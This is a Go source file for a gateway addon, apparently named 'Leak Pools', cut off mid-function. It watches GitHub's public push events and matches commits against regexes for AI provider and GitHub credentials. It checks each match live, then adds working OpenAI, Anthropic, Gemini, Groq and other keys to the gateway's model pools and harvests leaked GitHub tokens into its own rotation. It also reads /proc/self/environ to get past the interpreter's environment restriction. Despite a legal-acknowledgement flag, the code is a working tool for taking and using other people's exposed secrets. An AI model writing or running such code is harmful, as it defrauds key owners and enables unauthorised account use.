// addon-kind: runtime
package main

// Leak Pools — GitHub leak scanner that feeds AuroraX provider pools.
//
// The addon scans GitHub public push events for exposed provider API keys,
// validates them non-destructively, and (optionally) registers each working
// key as a pool-only provider in the local AuroraX gateway. Distinct keys for
// the same provider are kept apart in alternative pools (`leak-openai`,
// `leak-openai_2`, …) unless pool_mode=shared is selected. Keys that stop
// authenticating are removed from the pool and the gateway on the revalidation
// interval.
//
// GitHub is the only alerting/source integration. There is no Telegram or
// other outbound notification path: the dashboard page and widgets read the
// local state file, and provider keys never leave the gateway except in the
// validation request to the provider they belong to.
//
// The addon also maintains its own GitHub token pool (classic PAT, fine-grained
// PAT, OAuth and app user tokens), grouped by GitHub account so tokens
// belonging to one user share that account's hourly budget correctly.
// Installation tokens are detected and validated but kept out of the rotation:
// the events feed they would need is scoped to a user, not an app.
//
// Authorization note: importing credentials that belong to someone else can
// violate provider terms, computer-misuse law and the rights of the key owner.
// Scanning is gated behind legal_ack; use it only for authorized security
// research and only on keys you are allowed to test.

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	extensionID        = "leak-pools"
	stateFileName      = "leak-pools-state.json"
	runtimeSockName    = "leak-pools-runtime.sock"
	runtimeOwnerName   = "leak-pools-runtime.owner"
	kindAppInstall     = "app installation token"
	tokenSourceEnv     = "env"
	tokenSourceLegacy  = "legacy"
	tokenSourceHarvest = "harvest"
	tokenSourceSetting = "settings"
	defaultGitHubAPI   = "https://api.github.com"
	defaultPollSecs    = 30
	defaultPerPage     = 100
	maxFindings        = 400
	maxSeenEvents      = 3000
	maxGitHubTokens    = 64
	maxModels          = 300
	maxPending         = 100
	maxListItems       = 60
	maxBodySnippet     = 320
	maxScanLine        = 1 << 20
	defaultTimeoutSec  = 10
)

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

type hookPayload struct {
	Hook      string            `json:"hook"`
	Extension string            `json:"extension"`
	Provider  string            `json:"provider"`
	Key       string            `json:"key"`
	Dir       string            `json:"dir"`
	Settings  map[string]string `json:"settings"`
	Config    map[string]string `json:"config"`
}

type config struct {
	Enabled             bool
	LegalAck            bool
	CreatePools         bool
	PoolMode            string
	PoolPrefix          string
	Services            map[string]bool
	GitHubToken         string
	GitHubTokens        string
	HarvestGitHubTokens bool
	ForgetSavedTokens   bool
	AdminURL            string
	AdminKey            string
	PollInterval        time.Duration
	PerPage             int
	MaxPushesPerCycle   int
	MaxImportsPerCycle  int
	MinEntropy          float64
	ValidateKeys        bool
	Revalidate          time.Duration
	Reconcile           time.Duration
	DeleteDead          bool
	AutoFetchModels     bool
	PoolOnly            bool
	GitHubAPI           string
	AllowAnonymous      bool
	RequestTimeout      time.Duration
	// StoreLoaded is true only when the extension settings were read from the
	// gateway store. Partial payloads must never be treated as "the operator
	// removed every token", or a Data/OnTick call could wipe the pool.
	StoreLoaded bool
}

type serviceDef struct {
	ID           string
	Name         string
	ProviderType string
	BaseURL      string
	ModelsURL    string
	ValidateURL  string
	Auth         string // bearer | anthropic | google
	ModelsMode   string // openai | google
	Importable   bool
	Hint         string
}

type keyPattern struct {
	Service    string
	Label      string
	Pattern    string
	Importable bool
}

type compiledPattern struct {
	Def keyPattern
	RE  *regexp.Regexp
}

type Finding struct {
	Service   string    `json:"service"`
	Label     string    `json:"label"`
	KeyHash   string    `json:"key_hash"`
	KeyMask   string    `json:"key_mask"`
	Repo      string    `json:"repo"`
	File      string    `json:"file"`
	Commit    string    `json:"commit"`
	Entropy   float64   `json:"entropy"`
	Valid     bool      `json:"valid"`
	Status    string    `json:"status"`
	Pool      string    `json:"pool,omitempty"`
	Provider  string    `json:"provider,omitempty"`
	Models    int       `json:"models,omitempty"`
	Error     string    `json:"error,omitempty"`
	FoundAt   time.Time `json:"found_at"`
	CheckedAt time.Time `json:"checked_at"`
	SeenCount int       `json:"seen_count"`
}

type ManagedKey struct {
	Service      string    `json:"service"`
	KeyHash      string    `json:"key_hash"`
	Key          string    `json:"key"`
	ProviderType string    `json:"provider_type"`
	BaseURL      string    `json:"base_url"`
	Provider     string    `json:"provider"`
	Pool         string    `json:"pool"`
	Models       []string  `json:"models"`
	Status       string    `json:"status"`
	CreatedAt    time.Time `json:"created_at"`
	LastCheck    time.Time `json:"last_check"`
	LastError    string    `json:"last_error,omitempty"`
	Failures     int       `json:"failures"`
}

type ManagedPool struct {
	Name      string    `json:"name"`
	Service   string    `json:"service"`
	Strategy  string    `json:"strategy"`
	Members   []string  `json:"members"`
	CreatedAt time.Time `json:"created_at"`
	UpdatedAt time.Time `json:"updated_at"`
}

type GitHubToken struct {
	Token         string    `json:"token"`
	Hash          string    `json:"hash"`
	Kind          string    `json:"kind"`
	UserID        int64     `json:"user_id"`
	Login         string    `json:"login"`
	Scopes        []string  `json:"scopes"`
	Remaining     int       `json:"remaining"`
	Reset         int64     `json:"reset"`
	RetryAfter    int64     `json:"retry_after"`
	Status        string    `json:"status"`
	LastUsed      time.Time `json:"last_used"`
	LastError     string    `json:"last_error,omitempty"`
	TotalRequests int64     `json:"total_requests"`
	TotalErrors   int64     `json:"total_errors"`
	// Source records where the token came from. Tokens pasted in the settings
	// are removed from the pool as soon as they disappear from the settings;
	// harvested tokens are kept independently.
	Source string `json:"source,omitempty"`
}

type PendingKey struct {
	Service  string    `json:"service"`
	Label    string    `json:"label"`
	Key      string    `json:"key"`
	KeyHash  string    `json:"key_hash"`
	Repo     string    `json:"repo"`
	File     string    `json:"file"`
	Commit   string    `json:"commit"`
	Entropy  float64   `json:"entropy"`
	AddedAt  time.Time `json:"added_at"`
	Attempts int       `json:"attempts"`
	LastErr  string    `json:"last_error,omitempty"`
}

type Counters struct {
	EventsSeen    int64 `json:"events_seen"`
	PushesScanned int64 `json:"pushes_scanned"`
	DiffsFetched  int64 `json:"diffs_fetched"`
	Candidates    int64 `json:"candidates"`
	Validated     int64 `json:"validated"`
	Imported      int64 `json:"imported"`
	Removed       int64 `json:"removed"`
	Errors        int64 `json:"errors"`
}

type State struct {
	Version        int           `json:"version"`
	CreatedAt      time.Time     `json:"created_at"`
	UpdatedAt      time.Time     `json:"updated_at"`
	LastCycle      time.Time     `json:"last_cycle"`
	LastPoll       time.Time     `json:"last_poll"`
	LastRevalidate time.Time     `json:"last_revalidate"`
	LastReconcile  time.Time     `json:"last_reconcile"`
	LastError      string        `json:"last_error"`
	ETag           string        `json:"etag"`
	SeenEvents     []string      `json:"seen_events"`
	Findings       []Finding     `json:"findings"`
	Keys           []ManagedKey  `json:"keys"`
	Pools          []ManagedPool `json:"pools"`
	GitHubTokens   []GitHubToken `json:"github_tokens"`
	Pending        []PendingKey  `json:"pending"`
	Counters       Counters      `json:"counters"`
	// ForgetHandled makes forget_saved_github_tokens a one-shot: it purges
	// unlisted tokens when the operator flips it on, and does not keep
	// deleting tokens harvested later while the switch stays on.
	ForgetHandled bool `json:"forget_handled,omitempty"`
}

type candidate struct {
	Service    string
	Label      string
	Key        string
	KeyHash    string
	Repo       string
	File       string
	Commit     string
	Entropy    float64
	FoundAt    time.Time
	Importable bool
}

type validationResult struct {
	Status string // valid | invalid | limited | error
	Models []string
	Error  string
}

type githubMeta struct {
	UserID    int64
	Login     string
	Scopes    []string
	Remaining int
	Reset     int64
}

type ghActor struct {
	Login string `json:"login"`
}

type ghRepo struct {
	Name string `json:"name"`
}

type ghPushPayload struct {
	Before string `json:"before"`
	Head   string `json:"head"`
	Size   int    `json:"size"`
}

type ghEvent struct {
	ID      string        `json:"id"`
	Type    string        `json:"type"`
	Actor   ghActor       `json:"actor"`
	Repo    ghRepo        `json:"repo"`
	Payload ghPushPayload `json:"payload"`
}

type ghCompareFile struct {
	Filename string `json:"filename"`
	Status   string `json:"status"`
	Patch    string `json:"patch"`
}

type ghCompare struct {
	Files   []ghCompareFile `json:"files"`
	HTMLURL string          `json:"html_url"`
}

type ghUser struct {
	ID    int64  `json:"id"`
	Login string `json:"login"`
}

type ghCoreRate struct {
	Remaining int   `json:"remaining"`
	Reset     int64 `json:"reset"`
}

type ghResources struct {
	Core ghCoreRate `json:"core"`
}

type ghRateLimit struct {
	Resources ghResources `json:"resources"`
}

type providerPayload struct {
	Name            string `json:"name"`
	Type            string `json:"type"`
	BaseURL         string `json:"base_url,omitempty"`
	APIKey          string `json:"api_key,omitempty"`
	Models          string `json:"models,omitempty"`
	Enabled         bool   `json:"enabled"`
	PoolOnly        bool   `json:"pool_only"`
	AutoFetchModels bool   `json:"auto_fetch_models"`
}

type providerPatch struct {
	APIKey string `json:"api_key,omitempty"`
	Models string `json:"models,omitempty"`
}

type poolPayload struct {
	Name        string   `json:"name"`
	Members     []string `json:"members"`
	Strategy    string   `json:"strategy"`
	HealthAware bool     `json:"health_aware"`
}

type adminProvider struct {
	Name string `json:"name"`
	Type string `json:"type"`
}

type adminProvidersResp struct {
	Providers []adminProvider `json:"providers"`
}

type adminPool struct {
	Name string `json:"name"`
}

type adminPoolsResp struct {
	Pools []adminPool `json:"pools"`
}

type adminInventory struct {
	Providers map[string]string
	Pools     map[string]bool
	// AllProviders also includes provider overrides the operator disabled.
	// /pools/options hides those, but a disabled provider still owns its name
	// and must not be shadowed by a newly imported provider.
	AllProviders map[string]string
	At           time.Time
}

type extensionRecord struct {
	ID       string            `json:"id"`
	Applied  bool              `json:"applied"`
	Settings map[string]string `json:"settings"`
	Config   map[string]string `json:"config"`
}

// ---------------------------------------------------------------------------
// Globals
// ---------------------------------------------------------------------------

var keyPatternDefs = []keyPattern{
	// GitHub tokens: feed the scanner's own pool, never a model provider.
	{Service: "github", Label: "GitHub Classic PAT", Pattern: `ghp_[a-zA-Z0-9]{36}`},
	{Service: "github", Label: "GitHub Fine-Grained PAT", Pattern: `github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59}`},
	{Service: "github", Label: "GitHub OAuth Token", Pattern: `gho_[a-zA-Z0-9]{36}`},
	{Service: "github", Label: "GitHub App User Token", Pattern: `ghu_[a-zA-Z0-9]{36}`},
	{Service: "github", Label: "GitHub App Installation Token", Pattern: `ghs_[a-zA-Z0-9._-]{36,600}`},

	// OpenAI: specific prefixes before the legacy sk- form.
	{Service: "openai", Label: "OpenAI Project", Pattern: `sk-proj-[a-zA-Z0-9_-]{80,180}`, Importable: true},
	{Service: "openai", Label: "OpenAI Service Account", Pattern: `sk-svcacct-[a-zA-Z0-9_-]{70,160}`, Importable: true},
	{Service: "openai", Label: "OpenAI Admin", Pattern: `sk-admin-[a-zA-Z0-9_-]{40,120}`},

	// DeepSeek: hex-only body, context-filtered below. It must come before the
	// generic sk- form because 40-48 hex chars also satisfy that pattern.
	{Service: "deepseek", Label: "DeepSeek", Pattern: `sk-[a-f0-9]{32,48}`, Importable: true},

	// OpenRouter before the generic sk- forms.
	{Service: "openrouter", Label: "OpenRouter", Pattern: `sk-or-v1-[a-zA-Z0-9_-]{64,100}`, Importable: true},

	// Anthropic: specific prefixes before the generic one.
	{Service: "anthropic", Label: "Anthropic API", Pattern: `sk-ant-api03-[a-zA-Z0-9_-]{80,120}`, Importable: true},
	{Service: "anthropic", Label: "Anthropic OAuth Token (not importable)", Pattern: `sk-ant-oat01-[a-zA-Z0-9_-]{70,120}`},
	{Service: "anthropic", Label: "Anthropic Admin", Pattern: `sk-ant-admin01-[a-zA-Z0-9_-]{70,120}`},
	{Service: "anthropic", Label: "Anthropic Generic", Pattern: `sk-ant-[a-zA-Z0-9_-]{70,120}`, Importable: true},

	// OpenAI legacy last: the loosest sk- pattern.
	{Service: "openai", Label: "OpenAI Legacy", Pattern: `sk-[a-zA-Z0-9]{40,60}`, Importable: true},

	// Google AI Studio keys are the common AIza… form; AQ.… are the newer
	// auth keys used by the Gemini CLI. Both authenticate with x-goog-api-key.
	{Service: "google", Label: "Google AI Studio", Pattern: `AIza[0-9A-Za-z_-]{35}`, Importable: true},
	{Service: "google", Label: "Google Gemini (Auth)", Pattern: `AQ\.[a-zA-Z0-9_-]{30,80}`, Importable: true},

	// Groq.
	{Service: "groq", Label: "Groq", Pattern: `gsk_[a-zA-Z0-9]{48,60}`, Importable: true},
}

var (
	compiledPatterns = compileKeyPatterns()

	activeD = struct {
		mu  sync.Mutex
		dir string
	}{}

	cycleGate    = make(chan struct{}, 1)
	loopMu       sync.Mutex
	loopRunning  bool
	runtimeRunID string
	// realEnv holds the process environment; see readProcessEnv.
	realEnv = readProcessEnv()

	invMu    sync.Mutex
	invCache adminInventory
	invBase  string
)

var serviceDefs = []serviceDef{
	{
		ID: "openai", Name: "OpenAI", ProviderType: "openai",
		BaseURL:     "https://api.openai.com/v1",
		ModelsURL:   "https://api.openai.com/v1/models",
		ValidateURL: "https://api.openai.com/v1/models",
		Auth:        "bearer", ModelsMode: "openai", Importable: true,
		Hint: "Chat-capable project, service-account and legacy keys.",
	},
	{
		ID: "anthropic", Name: "Anthropic", ProviderType: "anthropic",
		BaseURL:     "https://api.anthropic.com/v1",
		ModelsURL:   "https://api.anthropic.com/v1/models",
		ValidateURL: "https://api.anthropic.com/v1/models",
		Auth:        "anthropic", ModelsMode: "openai", Importable: true,
		Hint: "Claude API keys (requires anthropic-version on validation).",
	},
	{
		ID: "deepseek", Name: "DeepSeek", ProviderType: "deepseek",
		BaseURL:     "https://api.deepseek.com",
		ModelsURL:   "https://api.deepseek.com/models",
		ValidateURL: "https://api.deepseek.com/models",
		Auth:        "bearer", ModelsMode: "openai", Importable: true,
		Hint: "Hex-style DeepSeek keys.",
	},
	{
		ID: "openrouter", Name: "OpenRouter", ProviderType: "openrouter",
		BaseURL:     "https://openrouter.ai/api/v1",
		ModelsURL:   "https://openrouter.ai/api/v1/models",
		ValidateURL: "https://openrouter.ai/api/v1/auth/key",
		Auth:        "bearer", ModelsMode: "openai", Importable: true,
		Hint: "sk-or-v1 keys; validated through /auth/key.",
	},
	{
		ID: "google", Name: "Google Gemini", ProviderType: "gemini",
		BaseURL:     "https://generativelanguage.googleapis.com/v1beta/openai",
		ModelsURL:   "https://generativelanguage.googleapis.com/v1beta/models",
		ValidateURL: "https://generativelanguage.googleapis.com/v1beta/models",
		Auth:        "google", ModelsMode: "google", Importable: true,
		Hint: "AI Studio auth keys (AQ.…) used with x-goog-api-key.",
	},
	{
		ID: "groq", Name: "Groq", ProviderType: "groq",
		BaseURL:     "https://api.groq.com/openai/v1",
		ModelsURL:   "https://api.groq.com/openai/v1/models",
		ValidateURL: "https://api.groq.com/openai/v1/models",
		Auth:        "bearer", ModelsMode: "openai", Importable: true,
		Hint: "gsk_ LPU keys.",
	},
	{
		ID: "github", Name: "GitHub", ProviderType: "",
		Importable: false,
		Hint:       "Added to the scanner's own GitHub token pool, not as a model provider.",
	},
}

var allowedExtensions = map[string]bool{
	".py": true, ".js": true, ".ts": true, ".jsx": true, ".tsx": true,
	".java": true, ".go": true, ".rb": true, ".php": true, ".sh": true,
	".env": true, ".ipynb": true, ".yml": true, ".yaml": true, ".json": true,
	".ini": true, ".properties": true, ".cfg": true, ".conf": true,
	".toml": true, ".md": true, ".txt": true, ".cs": true,
}

// ---------------------------------------------------------------------------
// Boot
// ---------------------------------------------------------------------------

// The gateway loads addon files with Yaegi at extension-apply time. A
// package-level initializer gives us a single background loop without relying
// on lifecycle hooks that older gateway builds do not dispatch.
var booted = autoStart()

func autoStart() bool {
	if strings.TrimSpace(envValue("AURORA_LEAK_POOLS_DISABLE_AUTOSTART")) == "1" {
		return true
	}
	dir := deriveStateDir()
	setActiveDir(dir)
	// Claim the runtime before the goroutine starts. A re-applied extension
	// evaluates a fresh Yaegi program while the previous one may still own the
	// loop; the new owner id tells the old loop to exit even though the
	// extension stayed applied.
	runtimeRunID = claimRuntime(dir)
	ensureStarted(dir)
	return true
}

// Yaegi evaluates addons in restricted mode, where os.Getenv reads only a
// virtual environment that starts empty, so the container's variables are
// invisible from the script. /proc/self/environ restores them, which keeps
// GITHUB_TOKEN/GH_TOKEN, AURORA_MASTER_KEY and the AURORA_* overrides working.
func readProcessEnv() map[string]string {
	out := make(map[string]string)
	data, err := os.ReadFile("/proc/self/environ")
	if err != nil || len(data) == 0 {
		return out
	}
	for _, kv := range strings.Split(string(data), "\x00") {
		if i := strings.Index(kv, "="); i > 0 {
			out[kv[:i]] = kv[i+1:]
		}
	}
	return out
}

func envValue(key string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return realEnv[key]
}

func deriveStateDir() string {
	if v := strings.TrimSpace(envValue("AURORA_LEAK_POOLS_STATE_DIR")); v != "" {
		return v
	}
	base := strings.TrimSpace(envValue("AURORA_EXTENSIONS_FILES_DIR"))
	if base == "" {
		base = "configs/extensions"
	}
	return filepath.Join(base, extensionID)
}

func setActiveDir(dir string) {
	dir = strings.TrimSpace(dir)
	if dir == "" {
		return
	}
	activeD.mu.Lock()
	activeD.dir = dir
	activeD.mu.Unlock()
}

func activeDir() string {
	activeD.mu.Lock()
	defer activeD.mu.Unlock()
	if activeD.dir == "" {
		return deriveStateDir()
	}
	return activeD.dir
}

// ensureStarted starts the background loop once, but unlike sync.Once it can
// start it again after the loop stopped. The loop exits when the extension is
// unapplied or another interpreter claims ownership, and a gateway-side apply
// can evaluate the program a moment before it records applied=true; in both
// cases a later hook (Data/OnApply) must be able to revive the loop.
func ensureStarted(dir string) {
	dir = strings.TrimSpace(dir)
	if dir == "" {
		dir = deriveStateDir()
	}
	setActiveDir(dir)
	loopMu.Lock()
	if loopRunning {
		loopMu.Unlock()
		return
	}
	loopRunning = true
	loopMu.Unlock()
	go func() {
		defer func() {
			loopMu.Lock()
			loopRunning = false
			loopMu.Unlock()
		}()
		runBackground(dir)
	}()
}

func runBackground(dir string) {
	// One loop per gateway process. Ownership has two layers:
	//
	//  1. the owner file, rewritten by every freshly evaluated program, which
	//     lets a re-applied extension take over even while it stays applied;
	//  2. a Unix socket, the cross-interpreter lock for the short overlap
	//     while the old loop is exiting and the new one is starting.
	//
	// The old loop checks ownership every couple of seconds, so an in-place
	// update does not leave stale code running until the next restart.
	runID := runtimeRunID
	// The gateway materialises and evaluates addon files before it flips
	// applied=true in the extension store, so the very first ownership check
	// can see a stale "not applied" record and kill the freshly started loop.
	// Wait for the store to catch up instead of losing the loop for good.
	if !waitForApplied(90 * time.Second) {
		return
	}
	for {
		if !runtimeOwned(dir, runID) {
			return
		}
		ln, ok := acquireRuntimeSocket(dir)
		if ok {
			defer closeQuietly(ln)
			break
		}
		if !sleepOwned(dir, runID, 5*time.Second) {
			return
		}
	}

	for {
		if !runtimeOwned(dir, runID) {
			return
		}
		cfg := loadConfigFromStore()
		// Settings are authoritative even while scanning is paused: a token
		// removed from the settings must not linger in the pool. Doing this
		// before the (slow) scan keeps removals immediate.
		maintainGitHubTokenSettings(activeDir(), cfg)
		if cfg.Enabled && cfg.LegalAck {
			runCycle(activeDir(), cfg)
		}
		wait := cfg.PollInterval
		if wait < 15*time.Second {
			wait = 15 * time.Second
		}
		if !sleepOwned(dir, runID, wait) {
			return
		}
	}
}

func runtimeOwnerPath(dir string) string {
	return filepath.Join(dir, runtimeOwnerName)
}

// claimRuntime writes a fresh owner id for this interpreter. The write is
// best-effort: if the directory is not writable the loop falls back to the
// socket lock and to extensionStillApplied.
func claimRuntime(dir string) string {
	id := fmt.Sprintf("%d-%d", time.Now().UnixNano(), os.Getpid())
	if strings.TrimSpace(dir) == "" {
		return id
	}
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return id
	}
	tmp := runtimeOwnerPath(dir) + ".tmp"
	if err := os.WriteFile(tmp, []byte(id), 0o600); err != nil {
		return id
	}
	_ = os.Rename(tmp, runtimeOwnerPath(dir))
	return id
}

// runtimeOwned reports whether this loop still owns the runtime. An empty id
// (autostart disabled, or the owner file could not be written) keeps the old
// behaviour and relies on extensionStillApplied plus the socket lock.
func runtimeOwned(dir, id string) bool {
	if !extensionStillApplied() {
		return false
	}
	if id == "" {
		return true
	}
	data, err := os.ReadFile(runtimeOwnerPath(dir))
	if err != nil {
		return true
	}
	return strings.TrimSpace(string(data)) == id
}

// waitForApplied waits (briefly) for the extension store to mark this addon
// as applied. Returns true when the extension is applied or when the store
// cannot answer at all; false only when it stays not-applied past limit.
func waitForApplied(limit time.Duration) bool {
	const step = 500 * time.Millisecond
	for waited := time.Duration(0); ; waited += step {
		if extensionStillApplied() {
			return true
		}
		if waited >= limit {
			return false
		}
		time.Sleep(step)
	}
}

// sleepOwned sleeps in short slices so an unapply or a new owner is noticed
// quickly instead of after a full poll interval.
func sleepOwned(dir, id string, total time.Duration) bool {
	const step = 2 * time.Second
	for total > 0 {
		if !runtimeOwned(dir, id) {
			return false
		}
		d := step
		if total < d {
			d = total
		}
		time.Sleep(d)
		total -= d
	}
	return runtimeOwned(dir, id)
}

func acquireRuntimeSocket(dir string) (net.Listener, bool) {
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return nil, false
	}
	path := filepath.Join(dir, runtimeSockName)
	ln, err := net.Listen("unix", path)
	if err == nil {
		return ln, true
	}
	// A live loop still owns the socket; a stale one only leaves the file.
	if conn, derr := net.DialTimeout("unix", path, 300*time.Millisecond); derr == nil {
		_ = conn.Close()
		return nil, false
	}
	_ = os.Remove(path)
	ln, err = net.Listen("unix", path)
	if err != nil {
		return nil, false
	}
	return ln, true
}

func closeQuietly(ln net.Listener) {
	if ln != nil {
		_ = ln.Close()
	}
}

func extensionStillApplied() bool {
	path := extensionStorePath()
	data, err := os.ReadFile(path)
	if err != nil {
		// Cannot tell (custom paths, first boot). Keep the loop alive; it
		// does nothing unless the config says enabled.
		return true
	}
	var recs []extensionRecord
	if err := json.Unmarshal(data, &recs); err != nil {
		return true
	}
	for _, rec := range recs {
		if rec.ID == extensionID {
			return rec.Applied
		}
	}
	// The store file is readable and the extension is gone: disabled/deleted.
	return false
}

func extensionStorePath() string {
	if v := strings.TrimSpace(envValue("AURORA_EXTENSIONS_PATH")); v != "" {
		return v
	}
	return "configs/extensions.json"
}

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

func defaultConfigMap() map[string]string {
	return map[string]string{
		"enabled":                    "false",
		"legal_ack":                  "false",
		"create_pools":               "true",
		"pool_mode":                  "per_key",
		"pool_prefix":                "leak",
		"services":                   "openai,anthropic,deepseek,openrouter,google,groq",
		"github_token":               "",
		"github_tokens":              "",
		"harvest_github_tokens":      "true",
		"forget_saved_github_tokens": "false",
		"admin_url":                  "",
		"admin_key":                  "",
		"poll_interval":              "30",
		"per_page":                   "100",
		"max_pushes_per_cycle":       "25",
		"max_imports_per_cycle":      "5",
		"min_entropy":                "3.6",
		"validate_keys":              "true",
		"revalidate_minutes":         "60",
		"reconcile_minutes":          "10",
		"delete_dead":                "true",
		"auto_fetch_models":          "true",
		"pool_only":                  "true",
		"github_api":                 defaultGitHubAPI,
		"allow_anonymous":            "false",
		"request_timeout_seconds":    "10",
	}
}

func loadConfigFromStore() config {
	raw := defaultConfigMap()
	loaded := false
	path := extensionStorePath()
	data, err := os.ReadFile(path)
	if err == nil {
		var recs []extensionRecord
		if json.Unmarshal(data, &recs) == nil {
			for _, rec := range recs {
				if rec.ID != extensionID {
					continue
				}
				for k, v := range rec.Settings {
					raw[k] = v
				}
				for k, v := range rec.Config {
					raw[k] = v
				}
				loaded = true
				break
			}
		}
	}
	cfg := configFromMap(raw)
	cfg.StoreLoaded = loaded
	return cfg
}

func configFromPayload(p hookPayload) config {
	raw := defaultConfigMap()
	for k, v := range p.Settings {
		raw[k] = v
	}
	for k, v := range p.Config {
		raw[k] = v
	}
	return configFromMap(raw)
}

func configFromMap(raw map[string]string) config {
	get := func(key, def string) string {
		if v, ok := raw[key]; ok && strings.TrimSpace(v) != "" {
			return strings.TrimSpace(v)
		}
		return def
	}
	cfg := config{
		Enabled:             parseBool(get("enabled", "false"), false),
		LegalAck:            parseBool(get("legal_ack", "false"), false),
		CreatePools:         parseBool(get("create_pools", "true"), true),
		PoolMode:            strings.ToLower(get("pool_mode", "per_key")),
		PoolPrefix:          sanitizeName(get("pool_prefix", "leak")),
		Services:            parseServices(get("services", "")),
		GitHubToken:         get("github_token", ""),
		GitHubTokens:        get("github_tokens", ""),
		HarvestGitHubTokens: parseBool(get("harvest_github_tokens", "true"), true),
		ForgetSavedTokens:   parseBool(get("forget_saved_github_tokens", "false"), false),
		AdminURL:            strings.TrimRight(get("admin_url", ""), "/"),
		AdminKey:            get("admin_key", ""),
		PollInterval:        time.Duration(maxInt(parseInt(get("poll_interval", "30"), defaultPollSecs), 15)) * time.Second,
		PerPage:             clampInt(parseInt(get("per_page", "100"), defaultPerPage), 1, 100),
		MaxPushesPerCycle:   clampInt(parseInt(get("max_pushes_per_cycle", "25"), 25), 1, 100),
		MaxImportsPerCycle:  clampInt(parseInt(get("max_imports_per_cycle", "5"), 5), 1, 25),
		MinEntropy:          parseFloat(get("min_entropy", "3.6"), 3.6),
		ValidateKeys:        parseBool(get("validate_keys", "true"), true),
		Revalidate:          time.Duration(maxInt(parseInt(get("revalidate_minutes", "60"), 60), 5)) * time.Minute,
		Reconcile:           time.Duration(maxInt(parseInt(get("reconcile_minutes", "10"), 10), 2)) * time.Minute,
		DeleteDead:          parseBool(get("delete_dead", "true"), true),
		AutoFetchModels:     parseBool(get("auto_fetch_models", "true"), true),
		PoolOnly:            parseBool(get("pool_only", "true"), true),
		GitHubAPI:           strings.TrimRight(get("github_api", defaultGitHubAPI), "/"),
		AllowAnonymous:      parseBool(get("allow_anonymous", "false"), false),
		RequestTimeout:      time.Duration(clampInt(parseInt(get("request_timeout_seconds", "10"), defaultTimeoutSec), 3, 60)) * time.Second,
	}
	if cfg.PoolPrefix == "" {
		cfg.PoolPrefix = "leak"
	}
	if cfg.PoolMode != "shared" {
		cfg.PoolMode = "per_key"
	}
	if cfg.AdminURL == "" {
		cfg.AdminURL = defaultAdminURL()
	}
	if cfg.AdminKey == "" {
		cfg.AdminKey = discoverMasterKey()
	}
	if cfg.GitHubAPI == "" {
		cfg.GitHubAPI = defaultGitHubAPI
	}
	return cfg
}

func parseServices(v string) map[string]bool {
	out := make(map[string]bool)
	v = strings.TrimSpace(v)
	if v == "" {
		// An explicitly cleared list means "import nothing"; the shipped
		// default already lists every supported service.
		return out
	}
	if v == "*" {
		for _, svc := range serviceDefs {
			if svc.ID != "github" {
				out[svc.ID] = true
			}
		}
		return out
	}
	for _, part := range splitList(v) {
		id := strings.ToLower(part)
		if id == "all" || id == "*" {
			for _, svc := range serviceDefs {
				if svc.ID != "github" {
					out[svc.ID] = true
				}
			}
			continue
		}
		if serviceByID(id).ID != "" {
			out[id] = true
		}
	}
	return out
}

func defaultAdminURL() string {
	port := strings.TrimSpace(envValue("PORT"))
	port = strings.TrimPrefix(port, ":")
	if port == "" {
		port = "8080"
	}
	base := strings.TrimSpace(envValue("BASE_PATH"))
	if base != "" && !strings.HasPrefix(base, "/") {
		base = "/" + base
	}
	base = strings.TrimRight(base, "/")
	return "http://127.0.0.1:" + port + base
}

// discoverMasterKey uses the same order the gateway itself does: environment
// first, then the YAML overlay. The extension setting wins when set (handled by
// the caller), which keeps the addon usable with an admin key separate from
// the gateway master key.
func discoverMasterKey() string {
	if v := strings.TrimSpace(envValue("AURORA_MASTER_KEY")); v != "" {
		return v
	}
	paths := []string{}
	if v := strings.TrimSpace(envValue("AURORA_CONFIG_PATH")); v != "" {
		paths = append(paths, v)
	}
	paths = append(paths, "configs/config.yaml", "config.yaml")
	for _, path := range paths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		for _, line := range strings.Split(string(data), "\n") {
			trimmed := strings.TrimSpace(line)
			if strings.HasPrefix(trimmed, "#") {
				continue
			}
			if !strings.HasPrefix(trimmed, "master_key:") {
				continue
			}
			val := strings.TrimSpace(strings.TrimPrefix(trimmed, "master_key:"))
			val = strings.Trim(val, `"'`)
			if strings.HasPrefix(val, "${") && strings.HasSuffix(val, "}") {
				name := strings.TrimSuffix(strings.TrimPrefix(val, "${"), "}")
				if i := strings.Index(name, ":-"); i >= 0 {
					def := name[i+2:]
					name = name[:i]
					if env := strings.TrimSpace(envValue(name)); env != "" {
						return env
					}
					return def
				}
				if env := strings.TrimSpace(envValue(name)); env != "" {
					return env
				}
				continue
			}
			if val != "" {
				return val
			}
		}
	}
	return ""
}

// ---------------------------------------------------------------------------
// Utility
// ---------------------------------------------------------------------------

func nowUTC() time.Time { return time.Now().UTC() }

func parseBool(v string, def bool) bool {
	switch strings.ToLower(strings.TrimSpace(v)) {
	case "1", "true", "yes", "on", "y":
		return true
	case "0", "false", "no", "off", "n":
		return false
	}
	return def
}

func parseInt(v string, def int) int {
	n, err := strconv.Atoi(strings.TrimSpace(v))
	if err != nil {
		return def
	}
	return n
}

func parseFloat(v string, def float64) float64 {
	f, err := strconv.ParseFloat(strings.TrimSpace(v), 64)
	if err != nil {
		return def
	}
	return f
}

func clampInt(v, lo, hi int) int {
	if v < lo {
		return lo
	}
	if v > hi {
		return hi
	}
	return v
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func splitList(v string) []string {
	v = strings.TrimSpace(v)
	if v == "" {
		return nil
	}
	if strings.HasPrefix(v, "[") && strings.HasSuffix(v, "]") {
		v = strings.TrimSuffix(strings.TrimPrefix(v, "["), "]")
	}
	var out []string
	for _, part := range strings.FieldsFunc(v, func(r rune) bool {
		return r == ',' || r == ';' || r == '\n' || r == '\r' || r == '\t'
	}) {
		part = strings.Trim(strings.TrimSpace(part), `"'`)
		if part != "" {
			out = append(out, part)
		}
	}
	return out
}

func sanitizeName(v string) string {
	v = strings.ToLower(strings.TrimSpace(v))
	var b strings.Builder
